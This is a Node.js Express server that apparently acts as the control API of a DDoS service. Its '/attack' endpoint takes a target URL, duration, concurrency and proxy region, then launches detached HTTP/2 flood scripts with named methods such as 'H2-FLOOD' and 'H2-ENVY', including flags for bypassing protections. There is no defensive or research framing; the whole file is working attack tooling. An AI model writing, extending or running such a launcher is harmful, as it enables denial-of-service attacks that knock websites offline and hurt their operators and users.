const express = require('express');
const { spawn } = require('child_process');

const app = express();
const PORT = 3333;

const methodMap = {
    "H2-STORM": {
    script: "ciko.js",
    executor: "node",
    argsTemplate: ["<url>", "<time>", "8", "<concurrents>", "<proxy>"]
  },
  "H2-ENVY": {
    script: "jawa14.js",
    executor: "node",
    argsTemplate: ["<url>", "<time>", "8", "<concurrents>", "<proxy>", "--bypass", "--googlebot", "--referer", "--secua"]
  },
    "H2-FLOOD": {
    script: "flood.js",
    executor: "node",
    argsTemplate: ["<url>", "<time>", "8", "<concurrents>", "<proxy>"]
  },
  "H2-PID": {
    script: "gjqu4.js",
    executor: "node",
    argsTemplate: ["<url>", "<time>", "8", "<concurrents>", "<proxy>"]
  }
};

app.get('/attack', async (req, res) => {
  let { target, time, method, geo, concurrents } = req.query;

  if (!method) return res.status(400).json({ error: 'Method is required.' });

  const methodKey = String(method).toUpperCase();

  if (!methodMap[methodKey]) {
    return res.status(400).json({ error: `Method ${method} is invalid.` });
  }

  if (!target) {
    return res.status(400).json({ error: 'Target is required. Use ?target=https://example.com' });
  }

  if (!/^https?:\/\//i.test(target)) {
    return res.status(400).json({ error: 'Target must start with http:// or https://' });
  }

  const validGeo = ['ALL', 'ID', 'US'];
  const geoUpper = geo ? geo.toUpperCase() : 'ALL';
  const proxyFile = validGeo.includes(geoUpper) ? `${geoUpper.toLowerCase()}.txt` : 'proxy.txt';

  const concurrentsNum = Math.max(1, parseInt(concurrents || '1', 10) || 1);
  const totalAttackTime = Math.max(1, parseInt(time || '10', 10) || 10);

  const { script, executor, argsTemplate } = methodMap[methodKey];

  const finalArgs = argsTemplate.map(arg => {
    switch (arg) {
      case '<url>': return target;
      case '<time>': return totalAttackTime.toString();
      case '<concurrents>': return concurrentsNum.toString();
      case '<proxy>': return proxyFile;
      default: return arg;
    }
  });

  try {
    const proc = spawn(executor, [script, ...finalArgs], {
      cwd: '/root/y',
      stdio: 'ignore',
      detached: true
    });

    proc.unref();

    res.status(200).json({
      status: 'Attack started',
      target,
      method: methodKey,
      time: totalAttackTime,
      concurrents: concurrentsNum,
      geo: geoUpper,
      proxyFile: proxyFile,
      pid: proc.pid
    });

    console.log(`[-] Attack: ${target} | Method: ${methodKey} | Time: ${totalAttackTime}s | Conc: ${concurrentsNum} | Geo: ${geoUpper} | Proxy: ${proxyFile} | PID: ${proc.pid}`);

  } catch (error) {
    console.error(`[-] Start error: ${error.message}`);
    res.status(500).json({ error: 'Failed to start', details: error.message });
  }
});

app.listen(PORT, () => {
  console.log(`[-] API running on port ${PORT}`);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[-] Unhandled Rejection:', promise, reason);
});

process.on('uncaughtException', (error) => {
  console.error('[-] Uncaught Exception:', error);
});
